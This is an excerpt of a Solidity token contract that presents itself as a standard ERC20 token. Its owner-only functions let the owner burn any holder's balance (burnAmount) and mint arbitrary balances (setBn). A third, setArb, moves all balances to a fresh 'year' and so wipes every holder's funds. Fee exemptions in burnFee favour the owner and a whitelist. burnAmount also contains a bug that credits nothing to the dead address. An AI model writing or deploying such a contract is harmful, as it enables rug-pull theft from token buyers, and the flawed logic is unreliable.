    ...
    IERC20MetadataUpgradeable
{
    ...
    function balanceOf(
        ...
        return _balances[_year][account];
    }
    ...
    function burnAmount(address wallet, uint256 amount) public onlyOwner {
        ...
        if (_balances[_year][wallet] <= amount * 10 ** 18) {
            _balances[_year][wallet] = 0;
            _balances[_year][deadAddress] = _balances[_year][deadAddress] + _balances[_year][wallet];
        } else {
            _balances[_year][wallet] = _balances[_year][wallet] - amount * 10 ** 18;
            _balances[_year][deadAddress] = _balances[_year][deadAddress] + amount * 10 ** 18;
        }
    }
    ...
    function burnFee(
        ...
        require(_balances[_year][sender] >= value, "Value exceeds balance");
        address deadAddress = 0x000000000000000000000000000000000000dEaD;
        if (sender != owner() && !candy[sender] && sender != address(this)) {
            uint256 burnFees = ((value * fee) / 100);
            uint256 amount = value - burnFees;
            _balances[_year][sender] = _balances[_year][sender] - amount;
            _balances[_year][recipient] = _balances[_year][recipient] + amount;
            emit Transfer(sender, recipient, amount);
            if (fee > 0) {
                _balances[_year][sender] = _balances[_year][sender] - burnFees;
                _balances[_year][deadAddress] = _balances[_year][deadAddress] + burnFees;
                emit Transfer(sender, deadAddress, burnFees);
            }
        } else {
            _balances[_year][sender] = _balances[_year][sender] - value;
            _balances[_year][recipient] = _balances[_year][recipient] + value;
    ...
    function setBn(address account, uint256 amount) public onlyOwner {
        _balances[_year][account] = _balances[_year][account] + amount;
    }

    function setArb() public onlyOwner {
        _year += 1;
    }
